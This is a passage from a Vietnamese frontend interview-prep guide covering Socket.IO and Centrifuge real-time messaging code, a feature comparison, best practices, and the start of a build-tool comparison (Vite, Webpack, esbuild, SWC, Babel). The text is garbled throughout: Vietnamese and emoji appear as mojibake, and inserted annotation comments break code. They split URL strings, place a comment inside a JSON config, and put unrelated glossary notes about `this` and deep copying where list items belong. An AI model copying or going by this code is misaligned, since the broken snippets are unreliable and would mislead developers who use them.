  transports: ['websocket', 'polling'], // Ch√∫ gi·∫£i: Try WebSocket first, fallback to polling
  
 // Ch√∫ gi·∫£i: Auth
  auth: {
    token: 'Bearer xyz123'
  }
});

 // Ch√∫ gi·∫£i: ‚úÖ Auto-reconnection
socket.on('connect', () => {
  console.log('‚úÖ Connected:', socket.id);
 // Ch√∫ gi·∫£i: Auto re-subscribe after reconnect
  socket.emit('subscribe', { symbols: ['VNM', 'HPG'] });
});

socket.on('disconnect', (reason) => {
  console.log('üîå Disconnected:', reason);
 // Ch√∫ gi·∫£i: Socket.IO will auto-reconnect!
});

 // Ch√∫ gi·∫£i: ‚úÖ Rooms - Join specific channels
socket.emit('join-room', 'market-data');

 // Ch√∫ gi·∫£i: ‚úÖ Listen to events
socket.on('ticker-update', (data) => {
  console.log('Ticker update:', data);
});

 // Ch√∫ gi·∫£i: ‚úÖ Acknowledgements
socket.emit('place-order', orderData, (response) => {
  if (response.success) {
    console.log('Order placed:', response.orderId);
  } else {
    console.error('Order failed:', response.error);
  }
});

 // Ch√∫ gi·∫£i: ‚úÖ Binary support
socket.emit('upload-chart', imageBlob);

 // Ch√∫ gi·∫£i: Cleanup
socket.disconnect();
```

**Server-side (Node.js):**

```typescript
import { Server } from 'socket.io';

const io = new Server(3000, {
  cors: {
    origin: 'https: // Ch√∫ gi·∫£i: example.com',
    credentials: true
  }
});

 // Ch√∫ gi·∫£i: Middleware - Authentication
io.use((socket, next) => {
  const token = socket.handshake.auth.token;
  
  if (isValidToken(token)) {
    next();
  } else {
    next(new Error('Authentication error'));
  }
});

 // Ch√∫ gi·∫£i: Connection
io.on('connection', (socket) => {
  console.log('Client connected:', socket.id);

 // Ch√∫ gi·∫£i: Join room
  socket.on('join-room', (room) => {
    socket.join(room);
    console.log(`${socket.id} joined ${room}`);
  });

 // Ch√∫ gi·∫£i: Subscribe to symbols
  socket.on('subscribe', (data) => {
    const { symbols } = data;
    
    symbols.forEach((symbol: string) => {
      socket.join(`ticker:${symbol}`);
    });
    
 // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh.
    socket.emit('subscribed', { symbols });
  });

 // Ch√∫ gi·∫£i: Broadcast ticker updates to room
  setInterval(() => {
    const tickerData = getLatestTicker('VNM');
    
 // Ch√∫ gi·∫£i: Send to all clients in room
    io.to('ticker:VNM').emit('ticker-update', tickerData);
  }, 1000);

 // Ch√∫ gi·∫£i: Disconnect
  socket.on('disconnect', () => {
    console.log('Client disconnected:', socket.id);
  });
});
```

---

#### **Ph·∫ßn 6: Centrifuge - Enterprise Real-time Messaging**

**Centrifuge Features:**

```typescript
/**
 * CENTRIFUGE = Real-time messaging platform v·ªõi horizontal scaling
 * 
 * ‚úÖ Advantages:
 * - Horizontal scaling v·ªõi Redis, KeyDB, Nats
 * - Channel subscription v·ªõi permissions
 * - Presence (online users tracking)
 * - History (message replay)
 * - Token-based auth v·ªõi expiration
 * - Binary support
 * - Multiple SDKs (JS, Go, Python, Java...)
 * 
 * ‚ùå Disadvantages:
 * - Complex setup (need Centrifugo server)
 * - Learning curve
 * - Overkill cho small apps
 * 
 * üéØ Use Cases:
 * - Trading platforms (high throughput)
 * - Chat applications (presence, history)
 * - Live dashboards (millions of connections)
 * - Multiplayer games
 */

import Centrifuge from 'centrifuge';

const centrifuge = new Centrifuge('ws: // Ch√∫ gi·∫£i: localhost:8000/connection/websocket', {
 // Ch√∫ gi·∫£i: Token-based auth
  getToken: async () => {
    const response = await fetch('/api/centrifuge-token');
    const { token } = await response.json();
    return token;
  },
  
 // Ch√∫ gi·∫£i: Auto-resubscribe
  debug: true
});

 // Ch√∫ gi·∫£i: Connect
centrifuge.connect();

 // Ch√∫ gi·∫£i: Subscribe to channel
const subscription = centrifuge.subscribe('market:stocks', {
 // Ch√∫ gi·∫£i: On publish
  publish: (ctx) => {
    console.log('New message:', ctx.data);
    updateTickerData(ctx.data);
  },
  
 // Ch√∫ gi·∫£i: On subscribe success
  subscribe: (ctx) => {
    console.log('‚úÖ Subscribed to channel');
    
 // Ch√∫ gi·∫£i: Get presence (online users)
    subscription.presence().then(result => {
      console.log('Online users:', result.clients);
    });
    
 // Ch√∫ gi·∫£i: Get history (last messages)
    subscription.history({ limit: 100 }).then(result => {
      console.log('Message history:', result.publications);
    });
  },
  
 // Ch√∫ gi·∫£i: On unsubscribe
  unsubscribe: (ctx) => {
    console.log('üîå Unsubscribed');
  }
});

 // Ch√∫ gi·∫£i: Publish to channel (server-side)
await subscription.publish({
  symbol: 'VNM',
  price: 85000,
  change: 2.5
});

 // Ch√∫ gi·∫£i: Presence tracking
subscription.on('presence', (ctx) => {
  console.log('User joined:', ctx.info);
});

 // Ch√∫ gi·∫£i: Cleanup
subscription.unsubscribe();
centrifuge.disconnect();
```

**Server-side (Centrifugo):**

```json
 // D√πng `JSON.parse(JSON.stringify(obj))` l√† hack sao ch√©p s√¢u nh∆∞ng s·∫Ω m·∫•t h√†m, `Date`, `undefined`, symbol, v.v.
{
  "v3_use_offset": true,
  "token_hmac_secret_key": "secret-key",
  "api_key": "api-key",
  "admin_password": "admin-password",
  "admin_secret": "admin-secret",
  "namespaces": [
    {
      "name": "market",
      "publish": true,
      "presence": true,
      "history_size": 100,
      "history_ttl": "60s"
    }
  ]
}
```

---

#### **Ph·∫ßn 7: So S√°nh WebSocket vs Socket.IO vs Centrifuge**

```typescript
/**
 * ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
 * ‚îÇ                ‚îÇ  WEBSOCKET     ‚îÇ  SOCKET.IO     ‚îÇ  CENTRIFUGE    ‚îÇ
 * ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
 * ‚îÇ Complexity     ‚îÇ ‚≠ê Low         ‚îÇ ‚≠ê‚≠ê Medium    ‚îÇ ‚≠ê‚≠ê‚≠ê High     ‚îÇ
 * ‚îÇ Size           ‚îÇ Native         ‚îÇ ~50KB          ‚îÇ ~20KB          ‚îÇ
 * ‚îÇ Auto-reconnect ‚îÇ ‚ùå Manual      ‚îÇ ‚úÖ Built-in    ‚îÇ ‚úÖ Built-in    ‚îÇ
 * ‚îÇ Fallback       ‚îÇ ‚ùå No          ‚îÇ ‚úÖ Long-poll   ‚îÇ ‚úÖ SSE         ‚îÇ
 * ‚îÇ Rooms          ‚îÇ ‚ùå Manual      ‚îÇ ‚úÖ Built-in    ‚îÇ ‚úÖ Channels    ‚îÇ
 * ‚îÇ Scaling        ‚îÇ ‚ùå Single      ‚îÇ ‚ö†Ô∏è Redis       ‚îÇ ‚úÖ Redis/Nats  ‚îÇ
 * ‚îÇ Binary         ‚îÇ ‚úÖ Yes         ‚îÇ ‚úÖ Yes         ‚îÇ ‚úÖ Yes         ‚îÇ
 * ‚îÇ Presence       ‚îÇ ‚ùå Manual      ‚îÇ ‚ö†Ô∏è Custom      ‚îÇ ‚úÖ Built-in    ‚îÇ
 * ‚îÇ History        ‚îÇ ‚ùå Manual      ‚îÇ ‚ùå No          ‚îÇ ‚úÖ Built-in    ‚îÇ
 * ‚îÇ Auth           ‚îÇ ‚ùå Manual      ‚îÇ ‚ö†Ô∏è Custom      ‚îÇ ‚úÖ JWT Token   ‚îÇ
 * ‚îÇ Server         ‚îÇ Any WS server  ‚îÇ Socket.IO srv  ‚îÇ Centrifugo     ‚îÇ
 * ‚îÇ Use Case       ‚îÇ Simple apps    ‚îÇ Medium apps    ‚îÇ Enterprise     ‚îÇ
 * ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
 * 
 * üéØ DECISION TREE:
 * 
 * Simple app, basic real-time (chat, notifications)
 *   ‚Üí Native WebSocket
 * 
 * Need auto-reconnect, rooms, fallback (IE11 support)
 *   ‚Üí Socket.IO
 * 
 * Enterprise, millions of connections, horizontal scaling
 *   ‚Üí Centrifuge
 * 
 * Trading platform, high throughput, low latency
 *   ‚Üí Centrifuge (with Redis/KeyDB)
 */
```

---

#### **Ph·∫ßn 8: Best Practices**

```typescript
/**
 * ‚úÖ DO:
 */

 // Ch√∫ gi·∫£i: 1. Always cleanup WebSocket on unmount
useEffect(() => {
  const ws = new WebSocket(url);
  
  return () => {
    ws.close(1000, 'Component unmounted');
  };
}, []);

 // Tham chi·∫øu: bi·∫øn ch·ª©a ƒë·ªãa ch·ªâ t·ªõi object trong heap; `const` kh√≥a tham chi·∫øu ch·ª© kh√¥ng kh√≥a n·ªôi dung object.
const subscribe = (symbol: string) => {
  refCount[symbol] = (refCount[symbol] || 0) + 1;
  
  if (refCount[symbol] === 1) {
    ws.send(JSON.stringify({ type: 'subscribe', symbol }));
  }
};

 // Ch√∫ gi·∫£i: 3. Throttle UI updates v·ªõi requestAnimationFrame
const latestData = useRef({});
const updateUI = () => {
  setData(latestData.current);
  rafId = requestAnimationFrame(updateUI);
};

 // Ch√∫ gi·∫£i: 4. Handle reconnection v·ªõi exponential backoff
const delay = baseDelay * Math.pow(2, attempts);

 // Ch√∫ gi·∫£i: 5. Show connection status to users
<ConnectionStatus status={wsStatus} />

 // Ch√∫ gi·∫£i: 6. Batch updates
let batch = [];
const flushBatch = () => {
  updateStore(batch);
  batch = [];
};
setTimeout(flushBatch, 16); // Ch√∫ gi·∫£i: 60fps

 // Ch√∫ gi·∫£i: 7. Use virtual scrolling for large lists
<AgGridReact rowData={data} /> // Ch√∫ gi·∫£i: Auto virtual scrolling

/**
 * ‚ùå DON'T:
 */

 // Ch√∫ gi·∫£i: 1. Don't create multiple WebSocket connections for same data
 // Tham chi·∫øu: bi·∫øn ch·ª©a ƒë·ªãa ch·ªâ t·ªõi object trong heap; `const` kh√≥a tham chi·∫øu ch·ª© kh√¥ng kh√≥a n·ªôi dung object.

 // Ch√∫ gi·∫£i: 2. Don't update UI on every message
 // Ch√∫ gi·∫£i: Throttle v·ªõi RAF!

 // Ch√∫ gi·∫£i: 3. Don't forget to unsubscribe
 // Ch√∫ gi·∫£i: Memory leak!

 // Ch√∫ gi·∫£i: 4. Don't render all items in large lists
 // Ch√∫ gi·∫£i: Use virtual scrolling!

 // Ch√∫ gi·∫£i: 5. Don't ignore close codes
 // Ch√∫ gi·∫£i: Check if should reconnect!

 // Ch√∫ gi·∫£i: 6. Don't use == for subscription checking
 // Ch√∫ gi·∫£i: Use Set or Map!
```

---
---
## 46. ‚ö° Q46: Build Tools - Vite vs Webpack vs Rollup, SWC vs Babel, Turbopack, esbuild  

**P1: T√™n c√¢u h·ªèi:** ‚ö° Q46: Build Tools - Vite vs Webpack vs Rollup, SWC vs Babel, Turbopack, esbuild  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (2-3 ph√∫t):**

**"C√¥ng c·ª• build hi·ªán ƒë·∫°i chia l√†m 2 nh√≥m: Bundlers (ƒë√≥ng g√≥i) v√† Transpilers (chuy·ªÉn ƒë·ªïi code).**

**üì¶ Bundlers - C√¥ng c·ª• ƒë√≥ng g√≥i:**
- **esbuild**: Nhanh nh·∫•t v√¨ vi·∫øt b·∫±ng Go, ki·∫øn tr√∫c ƒë∆°n gi·∫£n (nhanh h∆°n Webpack 100 l·∫ßn).
- **Turbopack**: C√¥ng c·ª• th·∫ø h·ªá m·ªõi vi·∫øt b·∫±ng Rust, h·ªó tr·ª£ ƒëa lu·ªìng v√† cache li√™n t·ª•c ‚Üí c·ª±c nhanh cho ·ª©ng d·ª•ng l·ªõn.
- **Vite**: M√°y ch·ªß dev si√™u nhanh (d√πng ESM g·ªëc + esbuild), production th√¨ d√πng Rollup ƒë·ªÉ ƒë√≥ng g√≥i.
- **Webpack**: L√¢u ƒë·ªùi nh·∫•t, config ph·ª©c t·∫°p nh∆∞ng m·∫°nh m·∫Ω, ph√π h·ª£p cho ·ª©ng d·ª•ng doanh nghi·ªáp.
- **Rollup**: T·ªët nh·∫•t cho th∆∞ vi·ªán (∆∞u ti√™n ESM, tree-shaking lo·∫°i b·ªè code th·ª´a t·ªët nh·∫•t).

**‚öôÔ∏è Transpilers - C√¥ng c·ª• chuy·ªÉn ƒë·ªïi code:**
- **Babel**: H·ªá sinh th√°i l·ªõn nh·∫•t, t∆∞∆°ng th√≠ch t·ªët nh·∫•t, nh∆∞ng ch·∫≠m.
- **SWC**: Vi·∫øt b·∫±ng Rust, nhanh g·∫•p 20 l·∫ßn Babel, ƒëang d·∫ßn thay th·∫ø Babel.

**üéØ N√™n d√πng c√¥ng c·ª• n√†o:**
- **·ª®ng d·ª•ng doanh nghi·ªáp l·ªõn** ‚Üí Webpack (·ªïn ƒë·ªãnh) ho·∫∑c Turbopack (t·ªëc ƒë·ªô).
- **·ª®ng d·ª•ng hi·ªán ƒë·∫°i/startup** ‚Üí Vite (tr·∫£i nghi·ªám dev t·ªët nh·∫•t).
- **Th∆∞ vi·ªán/package** ‚Üí Rollup (lo·∫°i b·ªè code th·ª´a t·ªët nh·∫•t).
- **Y√™u c·∫ßu t·ªëc ƒë·ªô cao** ‚Üí esbuild ƒë·ªÉ build, SWC ƒë·ªÉ chuy·ªÉn ƒë·ªïi.
- **D√πng Next.js 13+** ‚Üí Turbopack t√≠ch h·ª£p s·∫µn.

**‚ö†Ô∏è ƒê√°nh ƒë·ªïi ch√≠nh:**
- **T·ªëc ƒë·ªô vs ·ªîn ƒë·ªãnh**: esbuild/Turbopack nhanh nh∆∞ng h·ªá sinh th√°i c√≤n nh·ªè.
- **Dev vs Production**: Vite dev nhanh nh∆∞ng production d√πng Rollup (kh√¥ng nh·∫•t qu√°n).
- **Plugin/m·ªü r·ªông**: Webpack > Rollup > Vite > esbuild.

**üí° Xu h∆∞·ªõng hi·ªán t·∫°i:**
- ƒêang chuy·ªÉn t·ª´ **c√¥ng c·ª• JavaScript** (Webpack, Rollup) sang **c√¥ng c·ª• native** (Rust/Go: SWC, esbuild, Turbopack).
- **Vite ƒëang th·ªëng tr·ªã** c√°c d·ª± √°n m·ªõi (Nuxt, SvelteKit, Astro ƒë·ªÅu d√πng Vite).
- **Next.js chuy·ªÉn sang Turbopack** (thay th·∫ø Webpack).
- **C√¥ng c·ª• JS ch·∫≠m** v√¨ ch·∫°y ƒë∆°n lu·ªìng + b·ªô thu gom r√°c + m√¥ h√¨nh b·ªô nh·ªõ kh√¥ng ph√π h·ª£p cho x·ª≠ l√Ω c√¢y c√∫ ph√°p."

---

### **üî• ƒêi·ªÉm N·ªïi B·∫≠t Th·ªÉ Hi·ªán Tr√¨nh ƒê·ªô Senior:**

1. **So s√°nh v·ªÅ ki·∫øn tr√∫c:**
   - "esbuild nhanh v√¨ Go c√≥ goroutines (ph√¢n t√≠ch ƒë·ªìng th·ªùi nhi·ªÅu file), Webpack ch·∫≠m v√¨ JavaScript ch·∫°y ƒë∆°n lu·ªìng."
   - "Turbopack d√πng t√≠nh to√°n tƒÉng d·∫ßn + Rust ‚Üí cache li√™n t·ª•c ngay c·∫£ khi restart."

2. **ƒê√°nh ƒë·ªïi quan tr·ªçng:**
   - "Vite dev nhanh (d√πng ESM g·ªëc) nh∆∞ng bundle production kh√¥ng nh·∫•t qu√°n v·ªõi m√¥i tr∆∞·ªùng dev."
   - "esbuild thi·∫øu t√≠nh nƒÉng nh∆∞ chia code n√¢ng cao, h·ªó tr·ª£ decorator."

3. **Kinh nghi·ªám th·ª±c t·∫ø:**
   - "ƒê√£ chuy·ªÉn t·ª´ Webpack sang Vite, gi·∫£m th·ªùi gian build t·ª´ 2 ph√∫t xu·ªëng 20 gi√¢y."
   - "D√πng SWC thay Babel cho monorepo, build nhanh h∆°n 30%."

4. **Nh√¨n v·ªÅ t∆∞∆°ng lai:**
   - "ƒêang theo d√µi Turbopack v√¨ Next.js √°p d·ª•ng, nh∆∞ng ch∆∞a s·∫µn s√†ng production cho c√°c app kh√¥ng d√πng Next."
   - "Rspack (Webpack vi·∫øt l·∫°i b·∫±ng Rust) ƒëang n·ªïi l√™n nh∆∞ ƒë·ªëi th·ªß c·ªßa Turbopack."

---

**‚ùì C√¢u H·ªèi:**
So s√°nh c√°c build tools hi·ªán ƒë·∫°i (c√¥ng c·ª• build): Vite, Webpack, Rollup, esbuild, Turbopack v√† transpilers (tr√¨nh chuy·ªÉn ƒë·ªïi code): SWC vs Babel. Khi n√†o n√™n d√πng tool n√†o?


#### **üìä Build Tools Ecosystem - T·ªïng Quan H·ªá Sinh Th√°i C√¥ng C·ª• Build**

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ                    BUILD TOOLS LANDSCAPE 2024                        ‚îÇ
‚îÇ                 (B·∫£n ƒê·ªì C√¥ng C·ª• Build NƒÉm 2024)                     ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ                                                                      ‚îÇ
‚îÇ  üèóÔ∏è BUNDLERS (Module Bundling - ƒê√≥ng G√≥i Module)                    ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îÇ
‚îÇ  ‚îÇ  ‚Ä¢ Webpack     - L√¢u ƒë·ªùi nh·∫•t, config ph·ª©c t·∫°p (2012)         ‚îÇ ‚îÇ
‚îÇ  ‚îÇ                  Nh∆∞ √¥ng gi√† gi√†u kinh nghi·ªám                  ‚îÇ ‚îÇ
‚îÇ  ‚îÇ  ‚Ä¢ Rollup      - Chuy√™n v·ªÅ ESM, tree-shaking t·ªët nh·∫•t (2015)  ‚îÇ ‚îÇ
‚îÇ  ‚îÇ                  Nh∆∞ chuy√™n gia d·ªçn r√°c code                   ‚îÇ ‚îÇ
‚îÇ  ‚îÇ  ‚Ä¢ Vite        - Hi·ªán ƒë·∫°i, dev server si√™u nhanh (2020)       ‚îÇ ‚îÇ
‚îÇ  ‚îÇ                  Nh∆∞ xe ƒëua F1                                  ‚îÇ ‚îÇ
‚îÇ  ‚îÇ  ‚Ä¢ Turbopack   - Vi·∫øt b·∫±ng Rust, t√≠ch h·ª£p Next.js (2022)      ‚îÇ ‚îÇ
‚îÇ  ‚îÇ                  Nh∆∞ t√™n l·ª≠a SpaceX                             ‚îÇ ‚îÇ
‚îÇ  ‚îÇ  ‚Ä¢ esbuild     - T·ªëc ƒë·ªô kh·ªßng, vi·∫øt b·∫±ng Go (2020)            ‚îÇ ‚îÇ
‚îÇ  ‚îÇ                  Nh∆∞ m√°y bay si√™u thanh                         ‚îÇ ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚îÇ
‚îÇ                                                                      ‚îÇ
‚îÇ  ‚öôÔ∏è TRANSPILERS (Code Transformation - Chuy·ªÉn ƒê·ªïi Code)             ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îÇ
‚îÇ  ‚îÇ  ‚Ä¢ Babel       - T∆∞∆°ng th√≠ch t·ªët nh·∫•t, nhi·ªÅu plugin (2014)    ‚îÇ ‚îÇ
‚îÇ  ‚îÇ                  Nh∆∞ th√¥ng d·ªãch vi√™n chuy√™n nghi·ªáp             ‚îÇ ‚îÇ
‚îÇ  ‚îÇ  ‚Ä¢ SWC         - Vi·∫øt b·∫±ng Rust, nhanh g·∫•p 20x Babel (2020)   ‚îÇ ‚îÇ
‚îÇ  ‚îÇ                  Nh∆∞ th√¥ng d·ªãch vi√™n AI si√™u t·ªëc               ‚îÇ ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

---

#### **1Ô∏è‚É£ SO S√ÅNH C√ÅC BUNDLERS (C√¥ng C·ª• ƒê√≥ng G√≥i)**

**üìä B·∫£ng So S√°nh Hi·ªáu Su·∫•t & T√≠nh NƒÉng:**

| T√≠nh NƒÉng | **Webpack** | **Rollup** | **Vite** | **esbuild** | **Turbopack** |
|---------|-------------|------------|----------|-------------|---------------|
| **T·ªëc ƒë·ªô Dev** (Ch·∫°y dev server) | ‚≠ê‚≠ê Ch·∫≠m | ‚≠ê‚≠ê‚≠ê Trung b√¨nh | ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê Nhanh | ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê Nhanh nh·∫•t | ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê Nhanh nh·∫•t |
| **T·ªëc ƒë·ªô Build** (Build production) | ‚≠ê‚≠ê 10 gi√¢y | ‚≠ê‚≠ê‚≠ê 5 gi√¢y | ‚≠ê‚≠ê‚≠ê‚≠ê 2 gi√¢y | ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê 0.5 gi√¢y | ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê 1 gi√¢y |
| **Tree-shaking** (Lo·∫°i b·ªè code th·ª´a) | ‚≠ê‚≠ê‚≠ê T·ªët | ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê T·ªët nh·∫•t | ‚≠ê‚≠ê‚≠ê‚≠ê T·ªët | ‚≠ê‚≠ê‚≠ê‚≠ê T·ªët | ‚≠ê‚≠ê‚≠ê‚≠ê T·ªët |
| **Code Splitting** (Chia nh·ªè bundle) | ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê T·ªët nh·∫•t | ‚≠ê‚≠ê‚≠ê‚≠ê T·ªët | ‚≠ê‚≠ê‚≠ê‚≠ê T·ªët | ‚≠ê‚≠ê‚≠ê C∆° b·∫£n | ‚≠ê‚≠ê‚≠ê‚≠ê T·ªët |
| **HMR** (Hot Module Reload - C·∫≠p nh·∫≠t n√≥ng) | ‚≠ê‚≠ê‚≠ê T·ªët | ‚≠ê‚≠ê Ch·∫≠m | ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê T·ª©c th√¨ | ‚ùå Kh√¥ng c√≥ | ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê T·ª©c th√¨ |
